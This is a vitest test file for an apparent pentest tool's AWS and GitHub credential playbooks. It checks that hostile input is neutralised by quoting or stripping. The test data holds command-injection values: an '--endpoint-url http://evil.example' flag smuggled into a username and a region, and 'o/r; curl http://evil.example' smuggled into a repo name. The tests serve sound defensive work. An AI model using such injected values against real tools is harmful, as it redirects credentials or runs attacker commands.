import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { existsSync, unlinkSync } from 'fs';
import type { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { GraphEngine } from '../../services/graph-engine.js';
import { registerAwsPlaybookTool } from '../aws-playbook.js';
import { registerGithubPlaybookTool } from '../github-playbook.js';
import type { EngagementConfig } from '../../types.js';

const TEST_STATE_FILE = './state-test-playbook-injection.json';

function makeConfig(): EngagementConfig {
  return {
    id: 'test-pb-inj', name: 'pb inj', created_at: new Date().toISOString(),
    scope: { cidrs: ['10.10.10.0/24'], domains: [], exclusions: [] },
    objectives: [], opsec: { name: 'pentest', max_noise: 1 },
  };
}
function cleanup(): void { try { if (existsSync(TEST_STATE_FILE)) unlinkSync(TEST_STATE_FILE); } catch { /* ignore */ } }

describe('playbook command-injection fencing (e2e)', () => {
  let engine: GraphEngine;
  let handlers: Record<string, (a: any) => Promise<any>>;

  beforeEach(() => {
    cleanup();
    engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    handlers = {};
    const server = {
      registerTool(name: string, _c: unknown, h: (a: any) => Promise<any>) { handlers[name] = h; },
    } as unknown as McpServer;
    registerAwsPlaybookTool(server, engine);
    registerGithubPlaybookTool(server, engine);
  });
  afterEach(() => cleanup());

  it('aws: a malicious parsed principal + operator region cannot inject an aws CLI global flag', async () => {
    engine.addNode({
      id: 'cred-aws', type: 'credential', label: 'aws', confidence: 1,
      discovered_at: new Date().toISOString(),
      cred_material_kind: 'token',
      cred_user: 'alice --endpoint-url http://evil.example',
      aws_profile: 'prod',
    } as any);
    const res = await handlers.expand_aws_credential({
      credential_id: 'cred-aws',
      regions: ['us-east-1 --endpoint-url http://evil.example'],
      skip_inventory: false,
      include_destructive: true,
    });
    const commands = (JSON.parse(res.content[0].text).steps as { command: string }[]).map(s => s.command).join('\n');
    // Injected flag is contained INSIDE single quotes (neutralized), never a bare token.
    expect(commands).toContain(`--user-name 'alice --endpoint-url http://evil.example'`);
    expect(commands).toContain(`--region 'us-east-1 --endpoint-url http://evil.example'`);
    expect(commands).not.toMatch(/--user-name alice --endpoint-url/);
    expect(commands).not.toMatch(/--region us-east-1 --endpoint-url/);
  });

  it('github: a malicious candidate repo cannot inject shell or a gh flag', async () => {
    engine.addNode({
      id: 'cred-gh', type: 'credential', label: 'gh', confidence: 1,
      discovered_at: new Date().toISOString(),
      cred_material_kind: 'pat', cred_user: 'octocat',
    } as any);
    const res = await handlers.expand_github_credential({
      credential_id: 'cred-gh', max_repos: 10, include_orgs: false,
      candidate_repos: ['o/r; curl http://evil.example'],
    });
    const commands = (JSON.parse(res.content[0].text).steps as { command: string }[]).map(s => s.command).join('\n');
    // `;` and other shell metachars are stripped; the remainder is single-quoted inside the path.
    expect(commands).toContain(`/repos/'o/r curl http://evil.example'/actions/secrets`);
    expect(commands).not.toMatch(/repos\/o\/r; curl/);
  });
});
